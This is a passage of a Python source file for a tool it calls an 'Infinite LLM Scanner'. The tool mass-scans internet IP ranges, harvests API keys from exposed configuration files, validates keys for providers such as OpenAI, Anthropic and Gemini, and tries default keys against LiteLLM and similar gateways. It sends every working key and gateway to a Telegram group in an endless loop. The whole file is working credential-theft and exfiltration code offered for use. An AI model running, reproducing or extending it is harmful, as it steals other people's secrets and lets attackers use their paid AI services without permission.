        coros = [validate_key(sess, k, sem) for k in keys]
        for coro in asyncio.as_completed(coros):
            r = await coro
            validated.append(r)
            if r['status'] == 'valid':
                print(f'  [VALID] {r["key_type"]}: {r["key_value"][:40]}... ({len(r["models"])} models)')

    return validated


# ═══════════════════════════════════════════════════════════════
# PHASE 3: LLM GATEWAY DETECTION
# ═══════════════════════════════════════════════════════════════

async def test_lite_llm_gate(session, ip, port, sem) -> dict | None:
    '''Test a LiteLLM gateway with default key.'''
    base = f'http://{ip}:{port}'
    result = {
        'ip': ip,
        'port': port,
        'framework': 'LiteLLM',
        'working_key': None,
        'models': [],
        'status': 'failed',
    }

    async with sem:
        for key in LITE_LLM_KEYS:
            headers = {'Content-Type': 'application/json'}
            if key:
                headers['Authorization'] = f'Bearer {key}'

            try:
                # Test models endpoint
                async with session.get(f'{base}/v1/models', headers=headers, ssl=False, timeout=AUTH_TIMEOUT) as resp:
                    if resp.status == 200:
                        try:
                            data = await resp.json(content_type=None)
                            models = parse_models(data, 'data[].id')
                            if models:
                                result['working_key'] = key if key else '(no-auth)'
                                result['models'] = models
                                result['status'] = 'models_found'
                                return result
                        except:
                            pass
                    elif resp.status == 401:
                        continue
            except Exception:
                pass

    return result


async def test_generic_gate(session, ip, port, sem) -> dict | None:
    '''Test a generic OpenAI-compatible gateway.'''
    base = f'http://{ip}:{port}'
    result = {
        'ip': ip,
        'port': port,
        'framework': 'Generic',
        'working_key': None,
        'models': [],
        'status': 'failed',
    }

    async with sem:
        for key in LITE_LLM_KEYS:
            headers = {'Content-Type': 'application/json'}
            if key:
                headers['Authorization'] = f'Bearer {key}'

            try:
                async with session.get(f'{base}/v1/models', headers=headers, ssl=False, timeout=AUTH_TIMEOUT) as resp:
                    if resp.status == 200:
                        try:
                            data = await resp.json(content_type=None)
                            models = parse_models(data, 'data[].id')
                            if models:
                                result['working_key'] = key if key else '(no-auth)'
                                result['models'] = models
                                result['status'] = 'models_found'
                                return result
                        except:
                            pass
                    elif resp.status == 401:
                        continue
            except Exception:
                pass

    return result


async def run_gate_detection(targets: list, concurrent: int = 100) -> list:
    print(f'\n[GATE_DETECT] Testing {len(targets)} LLM gateways...')
    sem = asyncio.Semaphore(concurrent)
    connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True)
    results = []
    done = 0

    async with aiohttp.ClientSession(timeout=AUTH_TIMEOUT, connector=connector) as sess:
        coros = []
        for t in targets:
            if t.get('port') in [4000, 4001, 8000]:
                coros.append(test_lite_llm_gate(sess, t['ip'], t['port'], sem))
            else:
                coros.append(test_generic_gate(sess, t['ip'], t['port'], sem))

        for coro in asyncio.as_completed(coros):
            r = await coro
            if r and r.get('status') == 'models_found':
                results.append(r)
            done += 1
            if done % 100 == 0:
                print(f'  [{done}/{len(targets)}] working_gates={len(results)}')

    print(f'  Working gates: {len(results)}')
    return results


# ═══════════════════════════════════════════════════════════════
# TELEGRAM REPORTER
# ═══════════════════════════════════════════════════════════════

async def report_key(key_entry: dict):
    '''Send validated key to Telegram group.'''
    provider = classify_provider(key_entry['key_type'], key_entry['key_value'])
    msg = format_key_message(
        provider=provider,
        key_value=key_entry['key_value'],
        source_url=key_entry.get('source_url', f"http://{key_entry['ip']}:{key_entry['port']}{key_entry.get('source_path','/')}"),
        models=key_entry.get('models', []),
        key_type=key_entry.get('key_type', 'api_key'),
    )
    ok = await send_telegram(msg)
    if ok:
        print(f'  [TG SENT] {provider} key to Telegram')
    return ok


async def report_gate(gate_entry: dict):
    '''Send working LLM gateway to Telegram group.'''
    msg = format_gate_message(
        ip=gate_entry['ip'],
        port=gate_entry['port'],
        framework=gate_entry.get('framework', 'LiteLLM'),
        working_key=gate_entry.get('working_key', ''),
        models=gate_entry.get('models', []),
    )
    ok = await send_telegram(msg)
    if ok:
        print(f"  [TG SENT] {gate_entry['framework']} gate to Telegram")
    return ok


def classify_provider(key_type: str, key_value: str) -> str:
    '''Classify key by its value format.'''
    v = key_value.strip()
    if v.startswith('AIzaSy'):
        return 'Gemini'
    if v.startswith('sk-or-v1-'):
        return 'OpenRouter'
    if v.startswith('sk-ant-api03-'):
        return 'Anthropic'
    if v.startswith('sk-proj-'):
        return 'OpenAI'
    if v.startswith('sk-svcacct-'):
        return 'OpenAI'
    if v.startswith('hf_'):
        return 'HuggingFace'
    if v.startswith('sk-') and len(v) == 35 and all(c in 'abcdef0123456789' for c in v[3:]):
        return 'DeepSeek'
    if v.startswith('sk-'):
        return 'OpenAI'
    if key_type in ('OpenRouter', 'Anthropic', 'Gemini', 'DeepSeek', 'HuggingFace'):
        return key_type
    return 'API_Key'


# ═══════════════════════════════════════════════════════════════
# MAIN INFINITE LOOP
# ═══════════════════════════════════════════════════════════════

async def infinite_loop(args):
    '''Main infinite scanning loop.'''
    cycle = 0
    total_keys_found = 0
    total_gates_found = 0

    print(f"\n{'='*70}")
    print(f'  INFINITE LLM SCANNER')
    print(f'  Output: {OUTPUT_DIR}')
    print(f'  Telegram: {TELEGRAM_CHAT_ID}')
    print(f"  Mode: {'NIANSUH_ONLY' if args.niansuh_only else ('GATE_ONLY' if args.gate_only else 'FULL')}")
    print(f"{'='*70}\n")

    while True:
        cycle += 1
        cycle_start = time.time()
        print(f'\n[{'='*60}]')
        print(f"  CYCLE {cycle} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[{'='*60}]")

        try:
            # ── Generate IP batch ──
            targets = []
            
            # Option 1: ZMap scan for fresh IPs
            if getattr(args, 'zmap', False):
                print(f'\n[ZMAP] Starting port scan...')
                ports_str = getattr(args, 'zmap_ports', '3000,4000,8000')
                ports = [int(p.strip()) for p in ports_str.split(',')]
                bandwidth = getattr(args, 'zmap_bandwidth', '10M')
                
                zmap_results = scan_ports_with_zmap(
                    ports=ports,
                    batch_size=IPS_PER_BATCH,
                    bandwidth=bandwidth
                )
                
                # Convert ZMap results to targets
                targets = zmap_to_targets(zmap_results)
                print(f'  ZMap collected {len(targets)} total targets')
            
            # Option 2: Fall back to generated IPs from cloud ranges
            if not targets:
                print(f'\n[GENERATE] Building IP batch from cloud ranges...')
                targets = generate_ip_batch(count=IPS_PER_BATCH)
                print(f'  Generated {len(targets)} new targets')

            # ── Phase 1: Niansuh Config Scan ──
            if not args.gate_only:
                keys = await run_niansuh_scan(targets, concurrent=SCAN_CONCURRENT)
                if keys:
                    # ── Validate keys ──
                    validated = await run_key_validation(keys, concurrent=30)
                    valid_keys = [v for v in validated if v['status'] == 'valid']

                    for vk in valid_keys:
                        save_found_key(vk)
                        await report_key(vk)
                        total_keys_found += 1
                        print(f"  [*] NEW WORKING KEY: {vk['key_type']} from {vk['ip']}")

                    print(f'  Valid keys this cycle: {len(valid_keys)}/{len(keys)}')
                    print(f'  Total keys found: {total_keys_found}')

            # ── Phase 2: LLM Gateway Scan ──
            if not args.niansuh_only:
                # For gate detection, also use targets but on various ports
                gate_targets = [
                    {'ip': t['ip'], 'port': 4000}
                    for t in targets[:500]  # Subset for gates
                ]
                # Add some port 3000 targets too
                gate_targets += [
                    {'ip': t['ip'], 'port': 3000}
                    for t in targets[:200]
                ]

                gates = await run_gate_detection(gate_targets, concurrent=AUTH_CONCURRENT)
                for g in gates:
                    save_found_gate(g)
                    await report_gate(g)
                    total_gates_found += 1
                    print(f"  [*] NEW WORKING GATE: {g['framework']} at {g['ip']}:{g['port']} key={g['working_key']}")

                print(f'  Gates this cycle: {len(gates)}')
                print(f'  Total gates found: {total_gates_found}')

        except Exception as e:
            print(f'\n  [ERROR] Cycle {cycle} failed: {e}')
            import traceback
            traceback.print_exc()

        cycle_time = time.time() - cycle_start
        print(f'\n  Cycle {cycle} done in {cycle_time:.1f}s')
        print(f'  Sleeping {CYCLE_SLEEP}s before next cycle...')

        # Save state
        state = {
            'cycle': cycle,
            'total_keys': total_keys_found,
            'total_gates': total_gates_found,
            'last_run': datetime.now().isoformat(),
        }
        json.dump(state, open(STATE_FILE, 'w'), indent=2)

        await asyncio.sleep(CYCLE_SLEEP)


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Infinite LLM Gateway + Key Scanner')
    parser.add_argument('--test', action='store_true', help='Test mode (1 cycle only)')
    parser.add_argument('--niansuh-only', action='store_true', help='Only scan config files')
    parser.add_argument('--gate-only', action='store_true', help='Only test LLM gateways')
    parser.add_argument('--batch-size', type=int, default=3000, help='IPs per cycle')
    parser.add_argument('--zmap', action='store_true', help='Use ZMap to scan for open ports')
    parser.add_argument('--zmap-ports', type=str, default='3000,4000,8000',
                       help='Comma-separated ports for ZMap scan (default: 3000,4000,8000)')
    parser.add_argument('--zmap-bandwidth', type=str, default='10M',
                       help='ZMap bandwidth limit (default: 10M)')
    args = parser.parse_args()

    IPS_PER_BATCH = args.batch_size

    # Check ZMap availability if --zmap flag used
    if args.zmap:
        if not is_zmap_available():
            print('[ERROR] ZMap not found! Install from: https://github.com/zmap/zmap')
            print('  Ubuntu/Debian: sudo apt install zmap')
            print('  macOS: brew install zmap')
            print('  From source: git clone https://github.com/zmap/zmap.git')
            sys.exit(1)
        print(f'[ZMAP] Enabled - will scan ports: {args.zmap_ports}')

    if args.test:
        # Run one cycle only
        print('[TEST MODE] Running single cycle...')
        asyncio.run(infinite_loop(args))
    else:
        # Infinite loop
        print('[INFINITE MODE] Starting infinite loop (Ctrl+C to stop)...')
        try:
            asyncio.run(infinite_loop(args))
        except KeyboardInterrupt:
            print('\n\n[STOPPED] Scanner stopped by user.')
            print(f'State saved to: {STATE_FILE}')
            sys.exit(0)